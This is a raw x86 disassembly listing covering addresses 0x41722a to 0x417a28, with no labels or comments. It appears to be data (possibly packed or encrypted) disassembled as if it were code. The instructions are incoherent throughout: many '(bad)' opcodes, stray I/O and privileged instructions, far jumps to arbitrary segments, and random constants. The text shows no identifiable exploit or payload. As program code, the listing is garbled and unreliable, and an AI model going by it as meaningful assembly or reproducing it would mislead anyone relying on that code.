  41722a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41722b:	out    dx,eax
  41722c:	jmp    0x4171b5
  41722e:	mov    eax,ds:0x9720333f
  417233:	fbstp  TBYTE PTR [ebx+0x79]
  417236:	pop    ebx
  417237:	pop    ebx
  417238:	cmp    BYTE PTR [ecx],bh
  41723a:	ret    0x831c
  41723d:	in     al,dx
  41723e:	adc    DWORD PTR [ecx],0x2591cfed
  417244:	jae    0x41723d
  417246:	div    esp
  417248:	lahf   
  417249:	into   
  41724a:	sub    BYTE PTR [ecx+esi*1+0x59],ah
  41724e:	add    ebx,edi
  417250:	mov    ecx,ecx
  417252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417253:	pusha  
  417254:	jecxz  0x41721d
  417256:	loope  0x4172d2
  417258:	test   al,0x3e
  41725a:	mov    ebp,es
  41725c:	jae    0x41725e
  41725e:	stos   BYTE PTR es:[edi],al
  41725f:	inc    esi
  417260:	xlat   BYTE PTR ds:[ebx]
  417261:	repnz dec eax
  417263:	add    al,ah
  417265:	bound  edx,QWORD PTR [eax+eiz*2+0x213c3eff]
  41726c:	jmp    ecx
  41726e:	(bad)  
  417270:	ss push 0x8819edb4
  417276:	pop    esi
  417277:	dec    ebp
  417278:	or     ecx,DWORD PTR [edi]
  41727a:	add    bl,BYTE PTR [edi+edx*2+0x46]
  41727e:	les    ebp,FWORD PTR [ecx-0x3f]
  417281:	(bad)  
  417282:	mov    cl,0xe9
  417284:	sbb    eax,0x9ece5610
  417289:	cmp    eax,0x50bdd582
  41728e:	jbe    0x4172e2
  417290:	mov    cl,0x76
  417292:	in     al,0xe4
  417294:	mov    ecx,0x5cf15fdc
  417299:	es push 0xffffffcd
  41729c:	mov    cl,0x59
  41729e:	mov    dl,0xba
  4172a0:	shl    DWORD PTR [ecx-0x14293908],1
  4172a6:	scas   al,BYTE PTR es:[edi]
  4172a7:	ss stc 
  4172a9:	mov    ch,ch
  4172ab:	lock push edx
  4172ad:	xor    al,BYTE PTR [ebx-0x65f28ba4]
  4172b3:	sbb    BYTE PTR [edi+eiz*8+0x4ffdbc8c],al
  4172ba:	xor    eax,0x40c251c3
  4172bf:	repz xor eax,0xcf0612a9
  4172c5:	xchg   DWORD PTR [ecx+0x762d0b2d],edx
  4172cb:	mov    edx,0x118a04e4
  4172d0:	cdq    
  4172d1:	xchg   esi,eax
  4172d2:	or     BYTE PTR [ecx+ecx*1+0x64b4325c],dh
  4172d9:	mov    edx,0xb4791610
  4172de:	mov    ah,0x1a
  4172e0:	ret    0xa2a1
  4172e3:	sub    edx,edi
  4172e5:	int3   
  4172e6:	xchg   ebx,eax
  4172e7:	lea    ebx,[ebx]
  4172e9:	in     al,0x6d
  4172eb:	mov    ds:0x98cc6c6c,eax
  4172f0:	cld    
  4172f1:	mov    ch,0x9d
  4172f3:	daa    
  4172f4:	adc    ecx,DWORD PTR [eax]
  4172f6:	seta   BYTE PTR [ebx]
  4172f9:	lahf   
  4172fa:	mov    eax,ds:0xbdd1e156
  4172ff:	adc    eax,0xc84ab5da
  417304:	nop
  417305:	imul   edx,DWORD PTR [ebx+edx*2-0xaf007c3],0x16571fce
  417310:	xlat   BYTE PTR ds:[ebx]
  417311:	dec    edi
  417312:	sar    BYTE PTR [ebx-0x35c739a5],cl
  417318:	fwait
  417319:	xor    al,0xe5
  41731b:	dec    esp
  41731c:	lds    esp,FWORD PTR [edx]
  41731e:	xor    al,0xa9
  417320:	sub    eax,0x24cdd7a7
  417325:	xchg   ecx,edx
  417327:	xor    DWORD PTR [edx+0x38337b3b],ecx
  41732d:	inc    ecx
  41732e:	and    ch,BYTE PTR [eax+eiz*2+0x2d48c7de]
  417335:	aaa    
  417336:	icebp  
  417337:	sbb    bl,dh
  417339:	mov    dh,0x94
  41733b:	add    eax,0x94560543
  417340:	fimul  DWORD PTR cs:[ebp+eiz*2+0x3e790365]
  417348:	lods   al,BYTE PTR ds:[esi]
  417349:	ds inc edi
  41734b:	stos   BYTE PTR es:[edi],al
  41734c:	jno    0x41737b
  41734e:	out    0xf2,al
  417350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417351:	bound  edx,QWORD PTR [ecx]
  417353:	inc    eax
  417354:	sbb    DWORD PTR cs:[edx+0x6],esp
  417358:	xor    DWORD PTR [edx+0x3bc2b230],esp
  41735e:	into   
  41735f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417360:	out    dx,eax
  417361:	outs   dx,BYTE PTR ds:[esi]
  417362:	dec    esp
  417363:	xlat   BYTE PTR ds:[ebx]
  417364:	inc    edx
  417365:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417366:	mov    edi,0xe9937932
  41736b:	ja     0x41736a
  41736d:	dec    ebx
  41736e:	jmp    0x9862:0x7eb213d4
  417375:	imul   esp,DWORD PTR [esi-0x3be30fd8],0x8159e523
  41737f:	fbstp  TBYTE PTR [ebx+eax*4-0x7c]
  417383:	in     al,dx
  417384:	jnp    0x4173ed
  417386:	sub    al,0xcd
  417388:	sub    BYTE PTR [edi],al
  41738a:	aas    
  41738b:	jecxz  0x417328
  41738d:	fisttp QWORD PTR [esi]
  41738f:	cwde   
  417390:	sub    DWORD PTR [ebx],ebx
  417392:	test   al,0x9a
  417394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417395:	jp     0x4173de
  417397:	lahf   
  417398:	lds    ebp,FWORD PTR [esi]
  41739a:	or     eax,DWORD PTR [ecx+0x312b783c]
  4173a0:	popa   
  4173a1:	xlat   BYTE PTR ds:[ebx]
  4173a2:	jbe    0x4173f6
  4173a4:	pop    ebp
  4173a5:	xor    ebx,eax
  4173a7:	pop    ds
  4173a8:	pop    ebx
  4173a9:	(bad)  
  4173aa:	push   ss
  4173ab:	or     dh,BYTE PTR [esi+0x57]
  4173ae:	aam    0xf2
  4173b0:	cmp    cl,ah
  4173b2:	in     al,0xee
  4173b4:	ds xchg esp,eax
  4173b6:	push   ss
  4173b7:	stc    
  4173b8:	test   eax,0xe4492898
  4173bd:	cld    
  4173be:	dec    esi
  4173bf:	push   edx
  4173c0:	cmovno esp,DWORD PTR [esi-0x5621c2ff]
  4173c7:	aas    
  4173c8:	arpl   WORD PTR [edi+edi*8-0x36],bp
  4173cc:	dec    ebp
  4173cd:	stos   BYTE PTR es:[edi],al
  4173ce:	cdq    
  4173cf:	adc    eax,0x2c8bbc42
  4173d4:	xchg   ebp,eax
  4173d5:	in     al,0xce
  4173d7:	cdq    
  4173d8:	or     ecx,DWORD PTR [eax+0x43]
  4173db:	dec    ebp
  4173dc:	jg     0x4173b2
  4173de:	jb     0x417449
  4173e0:	adc    BYTE PTR [ecx-0x56],bh
  4173e3:	loope  0x417442
  4173e5:	sti    
  4173e6:	cwde   
  4173e7:	mov    ds:0x2039df0b,eax
  4173ec:	inc    ebx
  4173ed:	or     eax,0x393596b3
  4173f2:	inc    esp
  4173f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173f4:	pop    esi
  4173f5:	mov    dh,0x57
  4173f7:	outs   dx,DWORD PTR ds:[esi]
  4173f8:	cmp    edx,DWORD PTR [edx-0x70]
  4173fb:	retf   
  4173fc:	outs   dx,DWORD PTR ds:[esi]
  4173fd:	into   
  4173fe:	xor    DWORD PTR [edi-0x2f],0xffffffdc
  417402:	push   cs
  417403:	mov    esp,0xdcde347d
  417408:	ins    BYTE PTR es:[edi],dx
  417409:	xor    eax,DWORD PTR [ebp+0x2f]
  41740c:	sub    DWORD PTR [edi-0x63],ecx
  41740f:	mov    edx,0x4948e0e2
  417414:	ror    BYTE PTR [edi-0x2],0x40
  417418:	jo     0x4173e6
  41741a:	jp     0x417424
  41741c:	test   DWORD PTR [eax],ecx
  41741e:	add    eax,0xda49b4ee
  417423:	jo     0x4173e8
  417425:	retf   
  417426:	jns    0x4173d5
  417428:	fsubr  QWORD PTR [edi-0x732a32fd]
  41742e:	cwde   
  41742f:	out    0x13,al
  417431:	add    ebp,ecx
  417433:	(bad)  
  417434:	stos   DWORD PTR es:[edi],eax
  417435:	data16 jns 0x41740a
  417438:	pop    es
  417439:	xor    ah,BYTE PTR [ebx-0x204ad18e]
  41743f:	and    al,BYTE PTR [eax-0x6279665f]
  417445:	cmp    al,0xcf
  417447:	dec    eax
  417448:	and    eax,0xc3c2ce38
  41744d:	rcl    edx,cl
  41744f:	or     eax,0x8df80b74
  417454:	jle    0x41747b
  417456:	into   
  417457:	mov    gs:0x2b42addc,al
  41745d:	in     al,0xd7
  41745f:	cli    
  417460:	sbb    ebx,DWORD PTR [ebx]
  417462:	and    DWORD PTR [ebx],eax
  417464:	das    
  417465:	adc    BYTE PTR [edi+esi*8-0x5a26e3ec],bh
  41746c:	inc    edx
  41746d:	push   cs
  41746e:	(bad)  
  41746f:	into   
  417470:	call   0x42c7:0xd55b7b0a
  417477:	mov    WORD PTR [edx-0x65],fs
  41747a:	adc    bh,dh
  41747c:	sbb    DWORD PTR [esi+0x29364f7],ebp
  417482:	or     eax,0x4b05fa3c
  417487:	cld    
  417488:	dec    esp
  417489:	stos   DWORD PTR es:[edi],eax
  41748a:	xor    dh,BYTE PTR [edx+eiz*4]
  41748d:	sbb    esp,DWORD PTR [ecx]
  41748f:	dec    eax
  417490:	and    ebp,esp
  417492:	adc    dl,dh
  417494:	push   ecx
  417495:	xor    ebp,ecx
  417497:	mov    al,bh
  417499:	mov    edx,edx
  41749b:	outs   dx,BYTE PTR ds:[esi]
  41749c:	loop   0x417437
  41749e:	mov    ebp,0x53a9dd13
  4174a3:	scas   al,BYTE PTR es:[edi]
  4174a4:	js     0x41742d
  4174a6:	jne    0x41748c
  4174a8:	jns    0x41746d
  4174aa:	dec    ebx
  4174ab:	mov    bh,0xdf
  4174ad:	rcr    BYTE PTR [esi-0x4db94b1f],1
  4174b3:	mov    bh,BYTE PTR [eax+0x6f605978]
  4174b9:	pushf  
  4174ba:	inc    edx
  4174bb:	mov    ah,cl
  4174bd:	test   eax,0x8f18e163
  4174c2:	mov    ds:0xa4c09fd0,al
  4174c7:	pop    esp
  4174c8:	add    DWORD PTR [eax+0x18052085],esi
  4174ce:	ins    BYTE PTR es:[edi],dx
  4174cf:	xor    ecx,DWORD PTR [edx-0x5381a89a]
  4174d5:	loopne 0x4174d6
  4174d7:	jg     0x417547
  4174d9:	and    al,0xfd
  4174db:	jno    0x4174c9
  4174dd:	test   ch,dh
  4174df:	fs mov dh,0xc9
  4174e2:	xor    BYTE PTR [ebx],bl
  4174e4:	sub    eax,0x32b1b537
  4174e9:	in     al,0x28
  4174eb:	push   ecx
  4174ec:	xor    ebx,DWORD PTR [edx]
  4174ee:	jb     0x4174bb
  4174f0:	or     DWORD PTR [esi],ebx
  4174f2:	mov    eax,0xd61211e5
  4174f7:	mov    ds:0xb4d9082f,eax
  4174fc:	or     BYTE PTR [edi],cl
  4174fe:	push   eax
  4174ff:	std    
  417500:	cdq    
  417501:	xlat   BYTE PTR ds:[ebx]
  417502:	pop    edx
  417503:	jmp    edx
  417505:	cld    
  417506:	pop    esp
  417507:	push   esi
  417509:	xchg   ecx,eax
  41750a:	and    al,0x3e
  41750c:	retf   
  41750d:	add    edx,ebp
  41750f:	xchg   esp,eax
  417510:	adc    DWORD PTR [eax+0x300b991b],ebx
  417516:	dec    esp
  417517:	outs   dx,BYTE PTR ds:[esi]
  417518:	dec    esp
  417519:	shl    edx,1
  41751b:	(bad)
  41751f:	lahf   
  417520:	push   edx
  417521:	ss stc 
  417523:	adc    al,0x22
  417525:	adc    al,0xf1
  417527:	mov    bl,0xd8
  417529:	and    esp,ebp
  41752b:	cmp    al,0xd4
  41752d:	push   0xffffffcc
  41752f:	mov    edx,0x2009c589
  417534:	(bad)  
  417535:	mov    dl,0x9e
  417537:	sbb    BYTE PTR [ebx+edi*1],bh
  41753a:	lea    ebp,[edx+0x7a]
  41753d:	ror    BYTE PTR [edx],0x96
  417540:	and    dh,BYTE PTR [esp+ebp*4]
  417543:	sbb    ch,BYTE PTR [esi-0x7]
  417546:	es inc eax
  417548:	inc    edi
  417549:	xchg   edi,eax
  41754a:	xor    cl,0x9
  41754d:	mov    ch,dh
  41754f:	push   ebx
  417550:	push   ecx
  417551:	mov    ebx,0x88b5a44e
  417556:	ret    
  417557:	ja     0x417546
  417559:	arpl   dx,di
  41755b:	mov    ds:0x65ab464d,al
  417560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417561:	ja     0x417588
  417563:	jle    0x4175cd
  417565:	xchg   esi,eax
  417566:	and    bh,BYTE PTR [ebx-0x3aa3a80f]
  41756c:	test   eax,0xa4a7593e
  417571:	xor    DWORD PTR [ebx-0x65],edx
  417574:	mov    ah,0x59
  417576:	add    DWORD PTR [edx-0x6329e116],ebx
  41757c:	adc    DWORD PTR [edi-0x5326b675],ebp
  417582:	fcom   DWORD PTR [si]
  417585:	in     al,0xfe
  417587:	or     eax,0xa4f2f1b
  41758c:	cmp    edx,ebx
  41758e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41758f:	pop    ecx
  417590:	(bad)  
  417592:	(bad)  
  417594:	dec    esp
  417595:	push   0xffffff99
  417597:	jg     0x4175e7
  417599:	outs   dx,DWORD PTR ds:[esi]
  41759a:	and    bl,0x2a
  41759d:	(bad)  
  41759f:	fnstsw WORD PTR [ecx]
  4175a1:	sub    BYTE PTR [eax+0xbb6e6b],cl
  4175a7:	or     eax,0x425aee40
  4175ac:	or     DWORD PTR [eax+0x32807009],ecx
  4175b2:	imul   eax,ebp,0x9da67c69
  4175b8:	repnz adc al,0xa6
  4175bb:	mov    al,0x7f
  4175bd:	adc    edi,DWORD PTR [ebx]
  4175bf:	cmp    cl,BYTE PTR [ecx]
  4175c1:	data16 hlt 
  4175c3:	sub    BYTE PTR [esi],bh
  4175c5:	mov    esi,0xbd3dd4d1
  4175ca:	xchg   esi,eax
  4175cb:	dec    ebp
  4175cc:	pop    es
  4175cd:	xor    al,ch
  4175cf:	jp     0x41758d
  4175d1:	and    bl,dh
  4175d3:	mov    ecx,DWORD PTR [edi+0x9c060e4]
  4175d9:	addr16 adc al,0xfc
  4175dc:	icebp  
  4175dd:	aam    0x2e
  4175df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175e0:	mov    esi,0x9d7100af
  4175e5:	into   
  4175e6:	pop    eax
  4175e7:	add    esi,DWORD PTR [ebx]
  4175e9:	out    0x4b,eax
  4175eb:	push   0xab5423d0
  4175f0:	repnz and al,0xed
  4175f3:	xchg   edi,eax
  4175f4:	comiss xmm7,DWORD PTR [esi-0x1b]
  4175f8:	call   0x420b:0x858c77ea
  4175ff:	xor    eax,0xb3bc1df7
  417604:	gs or  eax,0x928e922b
  41760a:	cld    
  41760b:	mov    dh,0x96
  41760d:	into   
  41760e:	push   ebx
  41760f:	adc    BYTE PTR [eax+esi*8-0x6f],ah
  417613:	pop    ds
  417614:	sbb    edx,DWORD PTR [ecx-0x6c]
  417617:	call   0xa3090e74
  41761c:	add    ecx,DWORD PTR [ecx+0x67]
  41761f:	sbb    eax,0x237a0bc4
  417624:	shr    DWORD PTR [ebp-0x585b4305],1
  41762a:	cmp    al,0xe8
  41762c:	pop    esp
  41762d:	push   esi
  41762e:	call   0xc1a74723
  417633:	add    edi,DWORD PTR [ecx-0x30]
  417636:	dec    edi
  417637:	inc    edi
  417638:	sahf   
  417639:	mov    ebx,0xef9db6fe
  41763e:	mov    edi,0xfb593771
  417643:	cld    
  417644:	dec    ecx
  417645:	sub    esi,DWORD PTR [edx+0x7a7adec3]
  41764b:	mov    bl,dh
  41764d:	push   esp
  41764e:	cmp    DWORD PTR [edi+0xfdcbecf],0xe0fa195d
  417658:	imul   ebp,eax,0xffffffbc
  41765b:	mov    esi,0x1568b89d
  417660:	jne    0x4175e2
  417662:	push   ss
  417663:	in     eax,dx
  417664:	imul   ecx,DWORD PTR [eax+0x43],0xffffffcf
  417668:	inc    ecx
  417669:	rcr    DWORD PTR [eax],0x15
  41766c:	das    
  41766d:	lahf   
  41766e:	daa    
  41766f:	inc    ebp
  417670:	out    dx,eax
  417671:	mov    al,bl
  417673:	pop    edx
  417674:	inc    esi
  417675:	(bad)  [ebp+0x1187058b]
  41767b:	sahf   
  41767c:	hlt    
  41767d:	jmp    FWORD PTR cs:[esp+eiz*8+0xf]
  417682:	lock (bad) 
  417684:	and    DWORD PTR [esi],eax
  417686:	jb     0x4176af
  417688:	dec    esp
  417689:	inc    esi
  41768a:	mov    al,ds:0x38f8cbaa
  41768f:	dec    edx
  417690:	je     0x41768e
  417692:	xor    bl,BYTE PTR [edx]
  417694:	stc    
  417695:	ins    DWORD PTR es:[edi],dx
  417696:	mov    dh,0xf
  417698:	inc    ebx
  417699:	(bad)  
  41769a:	xor    eax,0x742aefd1
  41769f:	xor    DWORD PTR [esp+edi*4+0x34],esi
  4176a3:	loop   0x417649
  4176a5:	xor    esi,esp
  4176a7:	pop    ds
  4176a8:	sbb    ah,BYTE PTR [edx]
  4176aa:	xchg   edx,eax
  4176ab:	repz jb 0x41770c
  4176ae:	test   DWORD PTR [ecx+0x3db7699b],ebx
  4176b4:	fs cli 
  4176b6:	mov    gs,WORD PTR [esi+0x66]
  4176b9:	and    ecx,DWORD PTR es:[edi+0x5ec10f63]
  4176c0:	nop
  4176c1:	rcl    esi,0xb1
  4176c4:	pop    ecx
  4176c5:	push   eax
  4176c6:	inc    ebp
  4176c7:	mov    cl,0x57
  4176c9:	adc    eax,0x7d3eed0
  4176ce:	sbb    BYTE PTR [edi+edx*4],0x5b
  4176d2:	adc    eax,0xd8a97ffc
  4176d7:	jbe    0x417686
  4176d9:	mov    edx,0x8c6d93b7
  4176de:	xor    BYTE PTR [ebx],ch
  4176e0:	fwait
  4176e1:	cdq    
  4176e2:	xor    esi,esp
  4176e4:	jecxz  0x417760
  4176e6:	test   al,0x20
  4176e8:	pop    ds
  4176e9:	inc    esp
  4176ea:	lahf   
  4176eb:	pop    es
  4176ec:	sub    edi,0xb1ca7854
  4176f2:	sub    eax,0xee05a618
  4176f7:	xor    DWORD PTR [ebx+0x6f],edx
  4176fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176fb:	aas    
  4176fc:	push   eax
  4176fd:	lock jge 0x41775e
  417700:	aaa    
  417701:	retf   0xd1ad
  417704:	lds    edi,FWORD PTR [edi+0x593af6b0]
  41770a:	sti    
  41770b:	jecxz  0x41775d
  41770d:	cmp    dl,BYTE PTR [ebp+0x2c5d80ab]
  417713:	repz mov ds:0x8c4c1368,eax
  417719:	inc    eax
  41771a:	adc    eax,DWORD PTR [eax+eax*4]
  41771d:	adc    edx,DWORD PTR [edi]
  41771f:	(bad)  
  417720:	imul   DWORD PTR [ecx]
  417722:	popa   
  417723:	pop    ebx
  417724:	adc    DWORD PTR [ebx+ecx*2],esi
  417727:	sbb    ebx,DWORD PTR [ecx]
  417729:	es pop esp
  41772b:	pop    es
  41772c:	aaa    
  41772d:	sbb    DWORD PTR [edi],edi
  41772f:	mov    ecx,0x9d469233
  417734:	xchg   esi,eax
  417735:	addr16 inc edx
  417737:	imul   ebp,ebx,0x7d87505b
  41773d:	pop    es
  41773e:	dec    ecx
  41773f:	cmp    esp,ebx
  417741:	test   eax,0xe44b90fe
  417746:	inc    esi
  417747:	jl     0x41779a
  417749:	mov    cl,0xb8
  41774b:	(bad)  
  41774c:	xor    esi,DWORD PTR [ebx+0x2a]
  41774f:	loop   0x417784
  417751:	ret    0x7570
  417754:	xor    BYTE PTR [esi-0x7b],0xe9
  417758:	sbb    eax,0xa60d9db8
  41775d:	adc    ebp,DWORD PTR [ecx]
  41775f:	xlat   BYTE PTR ds:[ebx]
  417760:	cmp    al,0x43
  417762:	fadd   QWORD PTR [edi+0x5f202f46]
  417768:	fiadd  DWORD PTR [ebx-0x7c1397ab]
  41776e:	mov    cl,0x8e
  417770:	push   0x548a6e6e
  417775:	cmp    bh,BYTE PTR [di]
  417778:	jle    0x41778d
  41777a:	call   0x14eb:0x5f1f29b9
  417781:	jns    0x41774b
  417783:	fcmovnb st,st(5)
  417785:	sub    al,0x20
  417787:	fsub   QWORD PTR [ecx+0x146c1ba0]
  41778d:	enter  0xe851,0x74
  417791:	jge    0x4177f1
  417793:	addr16 mov eax,0xd0f486f9
  417799:	pusha  
  41779a:	sub    DWORD PTR [edi-0x54e8b818],0x81bc1779
  4177a4:	js     0x417777
  4177a6:	pushf  
  4177a7:	retf   
  4177a8:	aaa    
  4177a9:	shl    DWORD PTR [edx],cl
  4177ab:	dec    edi
  4177ac:	sub    eax,0x7c7b53b9
  4177b1:	dec    eax
  4177b2:	fcom   st(6)
  4177b4:	call   0xbd20:0xcc8a4a7b
  4177bb:	iret   
  4177bc:	xchg   esi,eax
  4177bd:	out    0xef,al
  4177bf:	lods   eax,DWORD PTR ds:[esi]
  4177c0:	retf   
  4177c1:	imul   cl
  4177c3:	mul    DWORD PTR [edi-0x52]
  4177c6:	mov    gs,WORD PTR [esi-0x44b3aaf9]
  4177cc:	call   0xf16a703d
  4177d1:	nop
  4177d2:	enter  0x253b,0x46
  4177d6:	push   ds
  4177d7:	xor    al,0xa2
  4177d9:	push   edi
  4177da:	and    ah,al
  4177dc:	fcom   DWORD PTR ds:0x3f5350f7
  4177e2:	test   bl,dl
  4177e4:	adc    BYTE PTR [ebx-0x109a6e],ch
  4177ea:	add    DWORD PTR [esi+0x7614b788],edx
  4177f0:	lock cmc 
  4177f2:	out    0xe4,al
  4177f4:	adc    eax,0x1c649d22
  4177f9:	push   ecx
  4177fa:	push   0x69
  4177fc:	jmp    0x5444:0xf9231ad9
  417803:	mov    ds:0x7323a226,al
  417808:	fsubr  st,st(0)
  41780a:	mov    edi,0xf42d944f
  41780f:	dec    ebp
  417810:	cmp    BYTE PTR [esi+0xf],bl
  417813:	pop    ecx
  417814:	add    eax,DWORD PTR [edx-0x27b81e83]
  41781a:	imul   edx,esp,0xfffffffc
  41781d:	or     al,0x75
  41781f:	sbb    DWORD PTR [esi-0x64],0x5af5f703
  417826:	cld    
  417827:	or     DWORD PTR [ecx+0x2b],ebp
  41782a:	fdiv   QWORD PTR [ebx]
  41782c:	and    cl,BYTE PTR [esp+esi*4-0x4b680ea2]
  417833:	mov    ebp,0x5a78cf3a
  417838:	push   0xad32a979
  41783d:	aam    0xa9
  41783f:	ret    0x6a24
  417842:	cmp    esi,DWORD PTR [eax]
  417844:	and    DWORD PTR [ecx-0x1b49ca5f],edx
  41784a:	rcl    BYTE PTR [edi],0xcc
  41784d:	dec    esp
  41784e:	xchg   DWORD PTR [esi-0x28],edx
  417851:	icebp  
  417852:	inc    esp
  417853:	jno    0x4178cb
  417855:	pop    ds
  417856:	ins    BYTE PTR es:[edi],dx
  417857:	scas   al,BYTE PTR es:[edi]
  417858:	rcr    bh,cl
  41785a:	add    eax,0xba3f5086
  41785f:	stc    
  417860:	dec    eax
  417861:	out    dx,eax
  417862:	aam    0x3
  417864:	retf   0xf113
  417867:	pop    ds
  417868:	adc    eax,0x1b1fb140
  41786d:	adc    eax,0xd9ae13ef
  417872:	cdq    
  417873:	mov    bl,0x39
  417875:	sti    
  417876:	cmp    BYTE PTR [ebx-0x728cf1cf],bl
  41787c:	aaa    
  41787d:	aaa    
  41787e:	jecxz  0x417819
  417880:	jg     0x41784a
  417882:	push   esp
  417883:	mov    WORD PTR [edx+0x32],ds
  417886:	cli    
  417887:	inc    ebx
  417888:	dec    ecx
  417889:	push   ebx
  41788a:	mov    ebx,0x1fc4ddad
  41788f:	add    eax,0xb6dc20eb
  417894:	push   0x935df62e
  417899:	jmp    0x417823
  41789b:	jb     0x41789f
  41789d:	pop    ebx
  41789e:	push   0x3a1da08c
  4178a3:	out    0xd3,eax
  4178a5:	out    0xa8,eax
  4178a7:	stos   DWORD PTR es:[edi],eax
  4178a8:	pop    ds
  4178a9:	push   eax
  4178aa:	lock pushf 
  4178ac:	pushf  
  4178ad:	xchg   ecx,edx
  4178af:	add    DWORD PTR [eax+ebx*8+0x5624b1f],eax
  4178b6:	cdq    
  4178b7:	and    eax,0x8d998633
  4178bc:	je     0x4178b3
  4178be:	adc    eax,0xb2ef3078
  4178c3:	lea    eax,[ebp-0x5c]
  4178c6:	cdq    
  4178c7:	out    0x8b,eax
  4178c9:	jp     0x417938
  4178cb:	scas   eax,DWORD PTR es:[edi]
  4178cc:	ins    BYTE PTR es:[edi],dx
  4178cd:	ss imul ebx,eax,0x53
  4178d1:	aad    0x3e
  4178d3:	mov    dl,0xd0
  4178d5:	ja     0x41789c
  4178d7:	sar    DWORD PTR [edx-0x7f],1
  4178da:	sub    ah,BYTE PTR [edx+0x26]
  4178dd:	mov    dh,0x42
  4178df:	sub    DWORD PTR [ebp-0x5e],eax
  4178e2:	sbb    al,0xe0
  4178e4:	adc    al,0xf0
  4178e6:	push   es
  4178e7:	jp     0x4178c5
  4178e9:	cwde   
  4178ea:	outs   dx,BYTE PTR ds:[esi]
  4178eb:	add    BYTE PTR [ecx],cl
  4178ed:	mov    ss,edx
  4178ef:	(bad)
  4178f3:	jmp    0xb8a1b768
  4178f8:	mov    al,0x4d
  4178fa:	and    ebp,DWORD PTR [ecx+ebx*4]
  4178fd:	jg     0x417905
  4178ff:	ja     0x417912
  417901:	fwait
  417902:	pop    ebx
  417903:	mov    esp,0x661e05a9
  417908:	xor    cl,BYTE PTR [edi]
  41790a:	and    esi,0xf147d439
  417910:	push   ebx
  417911:	sbb    eax,0xdda1f9cc
  417916:	mov    ds:0xf65cda0c,eax
  41791b:	addr16 (bad) 
  41791d:	sti    
  41791e:	std    
  41791f:	nop
  417920:	xor    al,BYTE PTR [eax-0x9d73a30]
  417926:	jl     0x41798d
  417928:	mov    eax,ds:0x8b54f259
  41792d:	fst    st(0)
  41792f:	mov    bl,0x10
  417931:	loope  0x41791d
  417933:	out    dx,al
  417934:	test   eax,0x6a1d24b8
  417939:	pusha  
  41793a:	data16 (bad) 
  41793c:	mov    dl,0x2f
  41793e:	push   gs
  417940:	adc    eax,0x2e0f95d5
  417945:	sahf   
  417946:	cmp    esp,DWORD PTR [ebp+ebx*2-0x23c0909]
  41794d:	xchg   edx,eax
  41794e:	mov    ah,0xe0
  417950:	and    BYTE PTR [eax-0x18e153fe],cl
  417956:	sub    eax,0x776b9ea4
  41795b:	ds div ah
  41795e:	(bad)  
  41795f:	aas    
  417960:	sbb    eax,0x19ba0c06
  417965:	inc    eax
  417966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417967:	pop    esi
  417968:	mov    ecx,0xfb914dc0
  41796d:	xchg   edx,eax
  41796e:	xchg   esi,eax
  41796f:	inc    edx
  417970:	lock and al,0xb1
  417973:	popw   ss
  417975:	bound  ebp,QWORD PTR [ebx]
  417977:	lods   al,BYTE PTR ds:[esi]
  417978:	cmp    DWORD PTR [edi-0x35ac93bf],0xffffffe7
  41797f:	nop
  417980:	cli    
  417981:	jne    0x4179d9
  417983:	or     DWORD PTR [ecx],edx
  417985:	pop    eax
  417986:	cwde   
  417987:	rcr    al,1
  417989:	test   al,0x6d
  41798b:	int    0x54
  41798d:	cli    
  41798e:	or     dl,BYTE PTR [ebp-0x59a81a38]
  417994:	adc    BYTE PTR [eax+0x1],al
  417997:	stc    
  417998:	fldpi  
  41799a:	fild   QWORD PTR [esi]
  41799c:	mov    ebp,?
  41799e:	test   eax,0xadae8d55
  4179a3:	pop    esi
  4179a4:	xor    dh,dl
  4179a6:	sti    
  4179a7:	dec    eax
  4179a8:	iret   
  4179a9:	sub    BYTE PTR [esi+0x18cb7643],ch
  4179af:	adc    al,0xb5
  4179b1:	sub    al,0xcd
  4179b3:	cmp    DWORD PTR [esi],edi
  4179b5:	lods   al,BYTE PTR ds:[esi]
  4179b6:	pusha  
  4179b7:	(bad)  
  4179b8:	xor    BYTE PTR [edx],cl
  4179ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179bb:	xlat   BYTE PTR ds:[ebx]
  4179bc:	mov    ds:0x3303807b,al
  4179c1:	pop    ecx
  4179c2:	cwde   
  4179c3:	ja     0x4179d7
  4179c5:	mov    esp,0x88161e91
  4179ca:	mov    ebx,0x832f433d
  4179cf:	(bad)  
  4179d0:	shl    BYTE PTR [eax+0x19c26be9],cl
  4179d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179d7:	div    BYTE PTR ds:0x56d01b16
  4179dd:	scas   al,BYTE PTR es:[di]
  4179df:	repz cmp bl,BYTE PTR [ecx]
  4179e2:	inc    esp
  4179e3:	bound  ecx,QWORD PTR [ebx+esi*4]
  4179e6:	cdq    
  4179e7:	cmp    eax,0x3a3e1f1a
  4179ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179ed:	cdq    
  4179ee:	dec    ecx
  4179ef:	mov    ch,0x8b
  4179f1:	ins    DWORD PTR es:[edi],dx
  4179f2:	jle    0x4179b9
  4179f4:	push   es
  4179f5:	jmp    0x417a71
  4179f7:	jns    0x417984
  4179f9:	mov    al,bl
  4179fb:	inc    esi
  4179fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179fd:	into   
  4179fe:	daa    
  4179ff:	mov    al,0xd9
  417a01:	mov    eax,0xf647fe
  417a06:	retf   0xf86f
  417a09:	sbb    eax,0xac86e957
  417a0e:	jne    0x417a3b
  417a10:	cs shl ecx,1
  417a13:	add    eax,0x12df798d
  417a18:	jmp    0xf00d1aeb
  417a1d:	jmp    0xa666:0x4e1897d9
  417a24:	pop    ss
  417a25:	sar    DWORD PTR [ecx],1
  417a27:	push   ebx
  417a28:	rcr    BYTE PTR [ebx+eax*1],cl
